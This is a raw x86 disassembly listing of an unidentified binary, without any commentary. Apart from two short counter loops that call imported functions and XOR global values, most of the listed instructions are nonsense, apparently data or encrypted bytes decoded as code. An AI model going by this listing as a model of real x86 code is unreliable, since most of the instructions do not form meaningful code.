  40a7f9:	mov    ebp,0x78c82db9
  40a7fe:	int3   
  40a7ff:	in     eax,dx
  40a800:	or     al,ch
  40a802:	bound  esp,QWORD PTR [eax]
  40a804:	stos   DWORD PTR es:[edi],eax
  40a805:	rcr    cl,cl
  40a807:	adc    eax,ebp
  40a809:	add    bl,cl
  40a80b:	ret    0x6a3a
  40a80e:	pop    ebp
  40a80f:	outs   dx,BYTE PTR ds:[esi]
  40a810:	xchg   ch,ah
  40a812:	retf   
  40a813:	pop    ebx
  40a814:	adc    BYTE PTR [ebx],al
  40a816:	addr16 nop
  40a818:	iret   
  40a819:	jb     0x40a858
  40a81b:	xchg   edi,eax
  40a81c:	jmp    0xe5a7:0x9a5334e
  40a823:	pop    esi
  40a824:	push   esp
  40a825:	fstp   DWORD PTR [ebx]
  40a827:	loopne 0x40a83e
  40a829:	pop    ss
  40a82a:	or     eax,0xeeb57f46
  40a82f:	cmp    eax,0x808b5e83
  40a834:	scas   al,BYTE PTR es:[edi]
  40a835:	bsr    ecx,DWORD PTR ds:0x4e4c2500
  40a83c:	add    al,0x6e
  40a83e:	pop    ss
  40a83f:	test   al,0xa0
  40a841:	sub    esp,ebx
  40a843:	icebp  
  40a844:	or     bh,BYTE PTR [eax+ecx*2-0x1bf23b7b]
  40a84b:	jl     0x40a883
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x4302dd,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x4302e9,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x23853887],bl
  40a93e:	fs cdq 
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a921
  40a948:	cs or  eax,0x35e39d65
  40a94e:	mov    ecx,edi
  40a950:	ds ins DWORD PTR es:[edi],dx
  40a952:	repnz push 0x1e
  40a955:	inc    ebp
  40a956:	aam    0x5a
  40a958:	lock pusha 
  40a95a:	pop    ebp
  40a95b:	out    dx,eax
  40a95c:	mov    al,0xaa
  40a95e:	fcmove st,st(5)
  40a960:	out    dx,al
  40a961:	xlat   BYTE PTR ds:[ebx]
  40a962:	mov    eax,0x75912e79
  40a967:	ret    
  40a968:	jmp    0x40a96a
  40a96a:	push   eax
  40a96b:	mov    ah,0x7
  40a96d:	mul    al
  40a96f:	out    0xa1,eax
  40a971:	out    dx,eax
  40a972:	inc    ebp
  40a973:	das    
  40a974:	ja     0x40a91d
  40a976:	xor    eax,0xff1ee967
  40a97b:	jmp    0x40a937
  40a97d:	mov    DWORD PTR [ebx],0x5f0210f0
  40a983:	or     al,0xef
  40a985:	lock (bad) 
  40a987:	daa    
  40a988:	mov    ds:0x7da0a71d,eax
  40a98d:	sub    ch,al
  40a98f:	out    0xb,eax
  40a991:	sbb    bl,al
  40a993:	sbb    esp,DWORD PTR [ebp-0x3]
  40a996:	in     eax,0xe2
  40a998:	jbe    0x40a979
  40a99a:	lods   al,BYTE PTR ds:[esi]
  40a99b:	cwde   
  40a99c:	push   0x28
  40a99e:	jb     0x40a972
  40a9a0:	mov    al,ds:0x9f49f67
  40a9a5:	xlat   BYTE PTR ds:[ebx]
  40a9a6:	hlt    
  40a9a7:	dec    ebx
  40a9a8:	push   ds
  40a9a9:	pushf  
  40a9aa:	aas    
  40a9ab:	and    eax,0xab94a16b
  40a9b0:	mov    bl,0x80
  40a9b2:	xor    DWORD PTR [esi],0xee40d615
  40a9b8:	std    
  40a9b9:	clc    
  40a9ba:	cmp    eax,0xdf3e062f
  40a9bf:	lods   al,BYTE PTR ds:[esi]
  40a9c0:	pop    eax
  40a9c1:	int    0x43
  40a9c3:	outs   dx,BYTE PTR ds:[esi]
  40a9c4:	pop    esp
  40a9c5:	xchg   esi,eax
  40a9c6:	mov    WORD PTR [eax-0xcbb18dc],es
  40a9cc:	cmp    ebx,0x5f9f46b9
  40a9d2:	sbb    ebx,esp
  40a9d4:	repz sbb BYTE PTR [edi+0x4f9bd11f],0x51
  40a9dc:	inc    esp
  40a9dd:	rcr    BYTE PTR [ebx-0x1b],0x81
  40a9e1:	push   ebp
  40a9e2:	scas   eax,DWORD PTR es:[edi]
  40a9e3:	sub    BYTE PTR [ebx+0xd],0x67
  40a9e7:	sub    edx,DWORD PTR [esi-0x3ec0fa78]
  40a9ed:	push   eax
  40a9ee:	push   esp
  40a9ef:	add    BYTE PTR [ecx+edx*4],cl
  40a9f2:	xchg   eax,esi
  40a9f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9f5:	hlt    
  40a9f6:	mov    ch,0x9a
  40a9f8:	xor    dh,BYTE PTR [eax+0x2654ff22]
  40a9fe:	loop   0x40aa52
  40aa00:	or     BYTE PTR [edx-0x1f],al
  40aa03:	mov    eax,0xb4c4498c
  40aa08:	mov    ebp,0xfc536478
  40aa0d:	addr16 or dl,al
  40aa10:	add    DWORD PTR [edx],ecx
  40aa12:	cmc    
  40aa13:	in     eax,0xe8
  40aa15:	ret    
  40aa16:	add    ah,BYTE PTR [edi+ecx*2-0x30225ea]
  40aa1d:	jae    0x40aa5f
  40aa1f:	sbb    DWORD PTR [ebx+ecx*4-0x38],edi
  40aa23:	(bad)  
  40aa24:	pushf  
  40aa25:	into   
  40aa26:	sahf   
  40aa27:	dec    edi
  40aa28:	aad    0x65
  40aa2a:	int3   
  40aa2b:	and    eax,0x544bc2dd
  40aa30:	mov    eax,DWORD PTR [edx+0x42392a50]
  40aa36:	fwait
  40aa37:	lds    esp,FWORD PTR [ebx+ecx*8-0x3f9336b7]
  40aa3e:	cdq    
  40aa3f:	dec    eax
  40aa40:	jle    0x40aa5c
  40aa42:	add    DWORD PTR [edi],edx
  40aa44:	scas   eax,DWORD PTR es:[edi]
  40aa45:	arpl   WORD PTR fs:[edi-0x2be68430],cx
  40aa4c:	pop    edi
  40aa4d:	repnz sahf 
  40aa4f:	adc    bl,BYTE PTR [edx-0x72]
  40aa52:	hlt    
  40aa53:	jmp    0xb644:0xce031068
  40aa5a:	push   ecx
  40aa5b:	mov    cl,0xc
  40aa5d:	jmp    0x8d0916c8
  40aa62:	mov    ah,0xa9
  40aa64:	call   0x7b963638
  40aa69:	rcl    BYTE PTR es:[eax],cl
  40aa6c:	into   
  40aa6d:	in     eax,dx
  40aa6e:	mov    bh,0x6f
  40aa70:	aad    0x3e
  40aa72:	cmc    
  40aa73:	repnz xchg ebp,eax
  40aa75:	(bad)  
  40aa76:	repz std 
  40aa78:	fisttp DWORD PTR [ebx]
  40aa7a:	dec    edx
  40aa7b:	push   0x3b56cedb
  40aa80:	test   BYTE PTR [eax+0x4065eee1],al
  40aa86:	inc    edx
  40aa87:	mov    al,0x21
  40aa89:	or     eax,0xc8e94c01
  40aa8e:	jmp    0x40aa3c
  40aa90:	push   ebp
  40aa91:	rol    DWORD PTR es:[edx+0x72d1b6f6],cl
  40aa98:	lea    esp,[esi-0x74]
  40aa9b:	xchg   ecx,eax
  40aa9c:	imul   esi,ebp,0x153032df
  40aaa2:	jle    0x40aa35
  40aaa4:	rcr    BYTE PTR [esi+0x27651f0b],1
  40aaaa:	add    eax,0xe24a1fb4
  40aaaf:	dec    edx
  40aab0:	sbb    DWORD PTR [ebp-0x6e],0x69
  40aab4:	test   BYTE PTR [ecx],bh
  40aab6:	dec    esi
  40aab7:	(bad)  
  40aab8:	in     eax,0x6c
  40aaba:	sub    ecx,edi
  40aabc:	adc    eax,DWORD PTR [ecx+0x11]
  40aabf:	bound  edi,QWORD PTR [ecx+0x1d]
  40aac2:	jl     0x40aa56
  40aac4:	add    BYTE PTR [edi+0x74],0x20
  40aac8:	xor    ebx,DWORD PTR ds:0xee0f5d85
  40aace:	mov    ds:0x1e45a802,eax
  40aad3:	hlt    
  40aad4:	stos   DWORD PTR es:[di],eax
  40aad6:	js     0x40aa99
  40aad8:	in     eax,0xdf
  40aada:	ret    0x1b83
  40aadd:	lahf   
  40aade:	inc    edx
  40aadf:	add    DWORD PTR [ebp+0x1069d066],ebp
  40aae5:	cmp    edi,0x92979bd7
  40aaeb:	add    eax,0x919381ea
  40aaf0:	sub    cl,BYTE PTR [ecx-0x77]
  40aaf3:	mov    dl,BYTE PTR [ebx-0x24]
  40aaf6:	jno    0x40aadc
  40aaf8:	jecxz  0x40ab73
  40aafa:	bound  esp,QWORD PTR [edi-0x41]
  40aafd:	cwde   
  40aafe:	test   al,ch
  40ab00:	scas   eax,DWORD PTR es:[edi]
  40ab01:	add    DWORD PTR [eax-0x38],eax
  40ab04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab05:	inc    ebp
  40ab06:	cs (bad) 
  40ab08:	(bad)  
  40ab09:	and    edx,esp
  40ab0b:	jmp    0x4ac01a0b
  40ab10:	push   esp
  40ab11:	adc    dh,BYTE PTR [eax]
  40ab13:	gs iret 
  40ab15:	dec    edi
  40ab16:	add    eax,0x71582018
  40ab1b:	cmp    esi,eax
  40ab1d:	in     eax,0xe8
  40ab1f:	loopne 0x40aac9
  40ab21:	cmp    BYTE PTR [esi-0x7f32fec9],bl
  40ab27:	bound  ebx,QWORD PTR [edi+edi*4+0x1d625c1]
  40ab2e:	xchg   ebp,eax
  40ab2f:	cmp    dl,BYTE PTR [eax]
  40ab31:	sbb    al,0xf7
  40ab33:	inc    ecx
  40ab34:	mov    DWORD PTR [edx-0x22],edx
  40ab37:	add    DWORD PTR [esp+ecx*4-0x71326bda],ebp
  40ab3e:	xor    ecx,DWORD PTR [ebp+0x73]
  40ab41:	data16 int3 
  40ab43:	scas   al,BYTE PTR es:[edi]
  40ab44:	push   ebp
  40ab45:	rcr    BYTE PTR [eax-0x20d4e921],1
  40ab4b:	dec    ecx
  40ab4c:	scas   al,BYTE PTR es:[edi]
  40ab4d:	fwait
  40ab4e:	and    BYTE PTR [ecx],dl
  40ab50:	pop    ss
  40ab51:	sub    eax,0xee0668cf
  40ab56:	push   esp
  40ab57:	(bad)  
  40ab58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab59:	mov    bh,0xfe
  40ab5b:	jmp    0xc4d:0x21bf3688
  40ab62:	(bad)  
  40ab63:	pop    es
  40ab64:	xchg   ebp,eax
  40ab65:	ds in  eax,0xe9
  40ab68:	or     eax,0x45bf46fd
  40ab6d:	aam    0x4
  40ab6f:	xchg   ebp,eax
  40ab70:	pusha  
  40ab71:	adc    al,0x3e
  40ab73:	sahf   
  40ab74:	mov    al,0xba
  40ab76:	sub    al,0xe9
  40ab78:	(bad)  
  40ab79:	mov    eax,ds:0x8d5b5f8d
  40ab7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab7f:	std    
  40ab80:	pop    ss
  40ab81:	mov    ?,WORD PTR [ebp+0x26]
  40ab84:	push   esi
  40ab85:	data16 into 
  40ab87:	push   0x51991b86
  40ab8c:	dec    esi
  40ab8d:	enter  0x616a,0x81
  40ab91:	dec    ebx
  40ab92:	xchg   esp,eax
  40ab93:	cmc    
  40ab94:	in     al,dx
  40ab95:	popf   
  40ab96:	mov    ds:0xef9df8d5,al
  40ab9b:	out    0x50,al
  40ab9d:	jae    0x40ab99
  40ab9f:	xor    eax,0xfa23cd31
  40aba4:	(bad)  
  40aba5:	pop    ebp
  40aba6:	in     al,0xbc
  40aba8:	lea    esi,[edi+edi*4+0x66]
  40abac:	out    dx,al
  40abad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abae:	test   al,0x40
  40abb0:	aas    
  40abb1:	and    DWORD PTR [esi+eax*8],edx
  40abb4:	cmp    DWORD PTR [edx],ecx
  40abb6:	xchg   esp,eax
  40abb7:	xor    BYTE PTR [edi-0x10],0x33
  40abbb:	sbb    al,0x7
  40abbd:	imul   ebp,DWORD PTR [edi+0x1f2fb09a],0xffffff8d
  40abc4:	nop
  40abc5:	retf   0xace5
  40abc8:	(bad)  
  40abc9:	cwde   
  40abca:	(bad)  
  40abcb:	into   
  40abcc:	mov    bh,0xed
  40abce:	repnz adc ch,BYTE PTR gs:[eax]
  40abd2:	clc    
  40abd3:	(bad)  
  40abd4:	outs   dx,DWORD PTR ds:[esi]
  40abd5:	xor    eax,0x18756f69
  40abda:	test   al,0x99
  40abdc:	xor    eax,0x9fcf5317
  40abe1:	test   DWORD PTR [esi+0x62],ebx
  40abe4:	js     0x40ac15
  40abe6:	pop    es
  40abe7:	in     eax,0xea
  40abe9:	xchg   esp,eax
  40abea:	push   ds
  40abeb:	adc    ecx,DWORD PTR [esi-0x269d344d]
  40abf1:	cmp    BYTE PTR [esi+0xae2bbc],bl
  40abf7:	bound  ecx,QWORD PTR [ebp+0x63]
  40abfa:	outs   dx,DWORD PTR ds:[esi]
  40abfb:	mov    cl,0xa
  40abfd:	call   FWORD PTR [eax]
  40abff:	sub    ch,BYTE PTR [eax+0x2cd06ab7]
  40ac05:	(bad)  [ecx+ecx*4+0x732f0cd4]
  40ac0c:	iret   
  40ac0d:	repnz (bad) 
  40ac0f:	enter  0x2c7c,0x24
  40ac13:	xchg   ebp,eax
  40ac14:	inc    edi
  40ac15:	add    al,0x99
  40ac17:	test   BYTE PTR [esi],dh
  40ac19:	mul    al
  40ac1b:	pop    ds
  40ac1c:	inc    esi
  40ac1d:	sub    BYTE PTR [eax-0x62],bh
  40ac20:	aaa    
  40ac21:	dec    eax
  40ac22:	cs xchg esi,eax
  40ac24:	stos   BYTE PTR es:[edi],al
  40ac25:	rol    DWORD PTR [ebx-0x68],0xc6
  40ac29:	mov    dh,0xf8
  40ac2b:	push   edx
  40ac2c:	imul   esp,DWORD PTR [ecx+0x7e9ba052],0xfffffff3
  40ac33:	fcmovbe st,st(0)
  40ac35:	push   esp
  40ac36:	mov    ecx,0x61f42bc9
  40ac3b:	inc    ebp
  40ac3c:	cmp    ecx,eax
  40ac3e:	cmc    
  40ac3f:	mov    cl,0x20
  40ac41:	mov    ebp,DWORD PTR [ecx-0x5e]
  40ac44:	ror    BYTE PTR [ebx],cl
  40ac46:	test   DWORD PTR [eax+0x2c],ebp
  40ac49:	or     eax,0x90a6015e
  40ac4e:	xchg   ebx,eax
  40ac4f:	jle    0x40abd6
  40ac51:	sbb    ebp,0x32
  40ac54:	pop    ebx
  40ac55:	cwde   
  40ac56:	cmp    BYTE PTR [ebx+edx*4-0x723e6b94],ah
  40ac5d:	adc    eax,0x2c4b273f
  40ac62:	sub    dh,BYTE PTR [ebx-0x610db09]
  40ac68:	jmp    0x2de6a019
  40ac6d:	mov    esi,0x5b02e5fc
  40ac72:	sbb    eax,DWORD PTR [edi-0x5e31c8a4]
  40ac78:	jl     0x40ac9c
  40ac7a:	inc    ecx
  40ac7b:	add    BYTE PTR [ebx-0x71ed0148],bh
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	lahf   
  40ac93:	(bad)  [ebx]
  40ac95:	mov    dl,0x49
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac83
  40ac9f:	mov    BYTE PTR [ebx-0x588b7656],ah
  40aca5:	lds    edi,FWORD PTR [esi-0x3b]
  40aca8:	push   cs
  40aca9:	push   eax
  40acaa:	jns    0x40ac92
  40acac:	sbb    eax,0xc40b8f78
  40acb1:	mov    eax,ds:0xbac77bf4
  40acb6:	sar    dl,cl
  40acb8:	(bad)  
  40acb9:	repnz fbstp TBYTE PTR gs:0x3c5d5d12
  40acc1:	and    DWORD PTR [edx],edx
  40acc3:	sbb    DWORD PTR [ecx+0xe],0x13f4e652
  40acca:	xchg   ecx,eax
  40accb:	jge    0x40ac9f
  40accd:	pop    es
  40acce:	mov    ds:0x4641e4fc,eax
  40acd3:	fwait
  40acd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd5:	shr    BYTE PTR [eax],cl
  40acd7:	js     0x40aca4
  40acd9:	mov    esp,0xa18eb40c
  40acde:	test   BYTE PTR [ecx],bl
  40ace0:	test   BYTE PTR [ebp+edx*4-0x47],ch
  40ace4:	inc    esp
  40ace5:	push   es
  40ace6:	xor    ebx,edx
  40ace8:	mov    ecx,0xb90e53ff
  40aced:	arpl   WORD PTR [edx-0x14f210d3],bx
  40acf3:	pcmpeqd mm0,QWORD PTR [edi+0x758d44e7]
  40acfa:	shl    edi,cl
  40acfc:	sbb    al,0xd3
  40acfe:	cmp    al,0xcd
  40ad00:	sbb    BYTE PTR [ebx-0x13],al
  40ad03:	dec    ebp
  40ad04:	jns    0x40ad67
  40ad06:	dec    esi
  40ad07:	sub    DWORD PTR [bp+si],eax
  40ad0a:	call   0x52f5c5d
  40ad0f:	xchg   edx,eax
  40ad10:	rcr    BYTE PTR [ebp-0x35b614a7],1
  40ad16:	xor    DWORD PTR [ecx-0x24495792],eax
  40ad1c:	inc    esp
  40ad1d:	inc    edx
  40ad1e:	add    al,0x7c
  40ad20:	or     DWORD PTR [ecx+0x3b],0xfffffffb
  40ad24:	pop    ds
  40ad25:	lds    edi,FWORD PTR [ebx+0x775c0d98]
  40ad2b:	and    al,0xd1
  40ad2d:	pop    esi
  40ad2e:	mov    eax,ds:0xf33c1e89
  40ad33:	push   edx
  40ad34:	or     al,0xa0
  40ad36:	js     0x40acd2
  40ad38:	mov    ebp,0x3770c7da
  40ad3d:	fs pop ebp
  40ad3f:	in     eax,0x96
  40ad41:	mov    edi,0x7f23c590
  40ad46:	cmp    al,0x85
  40ad48:	lods   al,BYTE PTR ds:[esi]
  40ad49:	and    DWORD PTR [edx-0x5b24b5d7],edi
  40ad4f:	scas   eax,DWORD PTR es:[edi]
  40ad50:	sbb    eax,0x5f3ed45b
  40ad55:	ins    DWORD PTR es:[edi],dx
  40ad56:	(bad)  
  40ad57:	xlat   BYTE PTR ds:[ebx]
  40ad58:	jge    0x40adcb
  40ad5a:	dec    edx
  40ad5b:	test   eax,0xa31f17e5
  40ad60:	dec    ecx
  40ad61:	rcr    BYTE PTR [edi+0x7b6e6d31],cl
  40ad67:	in     eax,0x67
  40ad69:	sub    esp,ebp
  40ad6b:	fs mov dl,0xf7
  40ad6e:	mov    bl,0xaa
  40ad70:	cld    
  40ad71:	(bad)  
  40ad72:	bnd jno 0x40ad47
  40ad75:	xchg   ecx,eax
  40ad76:	je     0x40ad6d
  40ad78:	jp     0x40adf0
  40ad7a:	cwde   
  40ad7b:	ss std 
  40ad7d:	push   edx
  40ad7e:	aam    0x5b
  40ad80:	(bad)  
  40ad81:	mov    eax,0x3d4177ab
  40ad86:	and    eax,0xda94fafe
  40ad8b:	cmp    al,0xdd
  40ad8d:	push   es
  40ad8e:	sub    BYTE PTR [ebx],al
  40ad90:	lods   eax,DWORD PTR ds:[esi]
  40ad91:	aad    0x55
  40ad93:	push   eax
  40ad94:	pop    edi
  40ad95:	int    0xb8
  40ad97:	xchg   eax,ebp
  40ad99:	cmp    esp,esi
  40ad9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad9c:	js     0x40ad33
  40ad9e:	add    BYTE PTR [ebp+ebp*4+0x43d42563],al
  40ada5:	call   0x2c6b:0x8c9af1ad
  40adac:	cmp    BYTE PTR [ebx-0x2a],bh
  40adaf:	jecxz  0x40ae13
  40adb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adb2:	pop    ss
  40adb3:	ret    
  40adb4:	rol    BYTE PTR [ebx+0x43f113c8],0xde
  40adbb:	jo     0x40adbc
  40adbd:	dec    ebx
  40adbe:	aad    0xc0
  40adc0:	mov    ebp,0xa2325acb
  40adc5:	push   es
  40adc6:	xchg   esp,eax
  40adc7:	pop    edi
  40adc8:	ret    0xd146
  40adcb:	test   eax,0xd3df3959
  40add0:	xchg   ecx,eax
  40add1:	inc    edi
  40add2:	xlat   BYTE PTR ds:[ebx]
  40add3:	arpl   ax,si
  40add5:	loope  0x40ae0f
  40add7:	lods   al,BYTE PTR ds:[esi]
  40add8:	sbb    al,0x6b
  40adda:	ins    BYTE PTR es:[edi],dx
  40addb:	xchg   ebp,eax
  40addc:	gs retf 
  40adde:	iret   
  40addf:	in     al,dx
  40ade0:	dec    ebx
  40ade1:	mov    esp,0xa8b7aa62
  40ade6:	xchg   esi,eax
  40ade7:	xchg   esi,eax
  40ade8:	lahf   
  40ade9:	dec    ecx
  40adea:	mov    ss,WORD PTR [edx-0xf]
  40aded:	inc    ecx
  40adee:	sbb    BYTE PTR [edi-0x1],bl
  40adf1:	jmp    ebx
  40adf3:	int    0xc0
  40adf5:	loop   0x40ae04
  40adf7:	push   ecx
  40adf8:	mov    ds:0x2c511fb1,al
  40adfd:	popf   
  40adfe:	dec    esp
  40adff:	mov    ebp,0xc45df155
  40ae04:	stos   BYTE PTR es:[edi],al
  40ae05:	xor    BYTE PTR [edi+0x0],0x90
  40ae09:	stc    
  40ae0a:	retf   
  40ae0b:	pop    esi
  40ae0c:	sbb    BYTE PTR [ebx-0x33339352],bl
  40ae12:	pop    ebp
  40ae13:	jge    0x40ade2
  40ae15:	adc    eax,0xf8727ae
  40ae1a:	sbb    BYTE PTR [esi],cl
  40ae1c:	je     0x40ae64
  40ae1e:	sub    BYTE PTR [ebp+0x1a],0xde
  40ae22:	mov    DWORD PTR [esi+0x1f],0x95f4e7f3
  40ae29:	inc    ecx
  40ae2a:	and    DWORD PTR [ecx+ebp*1],ecx
  40ae2d:	sub    al,0xbb
  40ae2f:	add    edx,DWORD PTR [eax+0x61]
  40ae32:	xor    al,0x1
  40ae34:	int    0xff
  40ae36:	xor    eax,0x18b30e78
  40ae3b:	mov    esi,0x60127102
  40ae40:	neg    BYTE PTR [edi]
  40ae42:	ja     0x40ae60
  40ae44:	sbb    bh,ch
  40ae46:	(bad)  
  40ae48:	xchg   ebp,eax
  40ae49:	add    edx,ebx
  40ae4b:	pop    esp
  40ae4c:	jmp    0x821a:0xa1a65213
  40ae53:	test   BYTE PTR [ecx],0xbd
  40ae56:	sub    ebp,DWORD PTR [ebx-0x36]
  40ae59:	mov    fs,WORD PTR ds:0x9b04adf7
  40ae5f:	ds cmp al,0xcb
  40ae62:	cmp    al,0xa1
  40ae64:	pop    ebp
  40ae65:	nop
  40ae66:	imul   esi,esi,0xf26dc20a
  40ae6c:	adc    esi,ecx
  40ae6e:	xlat   BYTE PTR ds:[ebx]
  40ae6f:	mov    bh,0xc3
  40ae71:	pop    ss
  40ae72:	hlt    
  40ae73:	inc    ecx
  40ae74:	gs in  al,0x32
  40ae77:	fistp  QWORD PTR [ebx]
  40ae79:	ins    DWORD PTR es:[edi],dx
  40ae7a:	fs jmp 0x91fd5668
  40ae80:	dec    esi
  40ae81:	cmp    ecx,DWORD PTR [edi]
  40ae83:	arpl   WORD PTR [ebp-0x1e],si
  40ae86:	xor    BYTE PTR [edi],cl
  40ae88:	retf   
  40ae89:	fwait
  40ae8a:	sbb    eax,DWORD PTR [esi-0x67a67f3a]
  40ae90:	dec    edi
  40ae91:	inc    edi
  40ae92:	dec    edx
  40ae93:	jne    0x40aedd
  40ae95:	pop    ds
  40ae96:	imul   ebp,esi,0x10
  40ae99:	call   0xc107:0x4dbd3167
  40aea0:	pop    ds
  40aea1:	mov    ds:0xa9e54420,al
  40aea6:	(bad)  
  40aea7:	push   ss
  40aea8:	sbb    DWORD PTR [ebx-0x63505cd5],esp
  40aeae:	pusha  
  40aeaf:	into   
  40aeb0:	add    eax,0x917dd78b
  40aeb5:	jmp    0x40aee0
  40aeb7:	pusha  
  40aeb8:	push   edi
  40aeb9:	mov    ebp,0x4f74bee5
  40aebe:	shr    esp,0x61
  40aec1:	or     DWORD PTR [edx+0x46],ebx
  40aec4:	popf   
  40aec5:	jl     0x40aec5
  40aec7:	push   edi
  40aec8:	mov    esi,0x30c6ce30
  40aecd:	lahf   
  40aece:	mov    esp,0xe312087a
  40aed3:	xchg   ebp,eax
  40aed4:	pop    ecx
  40aed5:	push   ss
  40aed6:	jne    0x40aedb
  40aed8:	pop    ecx
  40aed9:	sbb    eax,0x5d0fbac1
  40aede:	pushf  
  40aedf:	aam    0xc
  40aee1:	std    
  40aee2:	dec    esi
  40aee3:	nop
  40aee4:	repz ret 
  40aee6:	adc    BYTE PTR [esi+0x2768f84a],ch
  40aeec:	push   esi
  40aeed:	fmul   DWORD PTR [esi]
  40aeef:	and    DWORD PTR [edi+0x6],0xca8c4c29
  40aef6:	sub    al,0xd8
  40aef8:	sub    BYTE PTR [ebx+0x4d],bl
  40aefb:	in     eax,dx
  40aefc:	xor    eax,0xff5eb6b4
  40af01:	test   eax,0xcbfb5ffd
  40af06:	mov    edi,eax
  40af08:	aas    
  40af09:	icebp  
  40af0a:	pop    gs
  40af0c:	shr    BYTE PTR [ebp+0x11f8b72c],1
  40af12:	in     eax,dx
  40af13:	ficomp WORD PTR [ecx+0x7f8604ec]
  40af19:	jno    0x40af45
  40af1b:	add    BYTE PTR [ebx-0x16],dl
  40af1e:	jo     0x40aed4
  40af20:	js     0x40af86
  40af22:	sub    al,0xa
  40af24:	pop    es
  40af25:	stos   BYTE PTR es:[edi],al
  40af26:	js     0x40afa5
  40af28:	mov    dh,0xa8
  40af2a:	cmp    BYTE PTR [edi+0x1400363b],ch
  40af30:	dec    edi
  40af31:	sahf   
  40af32:	jmp    0x40aeff
  40af34:	inc    edi
  40af35:	cmc    
  40af36:	into   
  40af37:	js     0x40aee7
  40af39:	jo     0x40aed1
  40af3b:	bound  esp,QWORD PTR [edx]
  40af3d:	cmpxchg DWORD PTR [ebp-0x2c],eax
  40af41:	xchg   esi,eax
  40af42:	mov    ecx,0x3c79d22f
  40af47:	in     eax,0xf1
  40af49:	mov    bl,0xbe
  40af4c:	stos   BYTE PTR es:[edi],al
  40af4d:	ins    BYTE PTR es:[edi],dx
  40af4e:	pop    esp
  40af4f:	in     al,0x4a
  40af51:	push   0x60
  40af53:	xor    BYTE PTR [edx-0xa6d6372],ah
  40af59:	sbb    eax,0x13ed8437
  40af5e:	jmp    0xf146:0x3fec394a
  40af65:	inc    esp
  40af66:	nop
  40af67:	dec    esp
  40af68:	leave  
  40af69:	int    0x77
  40af6b:	cli    
  40af6c:	and    eax,0xb60bcfb8
  40af71:	lahf   
  40af72:	mov    bh,0xca
  40af74:	mov    bh,0x3a
  40af76:	repnz and esi,DWORD PTR [esi+0x44ce5f1d]
  40af7d:	or     eax,0x8e58507e
  40af82:	or     DWORD PTR [ecx],ebp
  40af84:	clc    
  40af85:	jp     0x40af78
  40af87:	(bad)  
  40af88:	int    0xd6
  40af8a:	dec    ecx
  40af8b:	dec    ebp
  40af8c:	xor    al,0x49
  40af8f:	pop    eax
  40af90:	jp     0x40af6a
  40af92:	jne    0x40af25
  40af94:	in     eax,0xbd
  40af96:	out    0x42,eax
  40af98:	ficom  WORD PTR [ecx]
  40af9a:	xchg   edx,eax
  40af9b:	call   0xc21282eb
  40afa0:	pop    es
  40afa1:	ss cld 
  40afa3:	sbb    ch,BYTE PTR [eax]
  40afa5:	cmp    BYTE PTR [esp+esi*4],dl
  40afa8:	inc    eax
  40afa9:	scas   al,BYTE PTR es:[edi]
  40afaa:	rcl    DWORD PTR [esi+0x75],cl
  40afad:	fwait
  40afae:	nop
  40afaf:	fidiv  DWORD PTR [edi+0x3b]
  40afb2:	mov    bh,0x8e
  40afb4:	jecxz  0x40af64
  40afb6:	mov    ds:0x2c1a628c,eax
  40afbb:	jmp    0xddd83033
  40afc0:	or     DWORD PTR [edx],eax
  40afc2:	jno    0x40afe7
  40afc4:	aad    0xe4
  40afc6:	push   ds
  40afc7:	xor    cl,cl
  40afc9:	xchg   edx,eax
  40afca:	and    DWORD PTR [ecx+0x5d893a2a],0xfffffff4
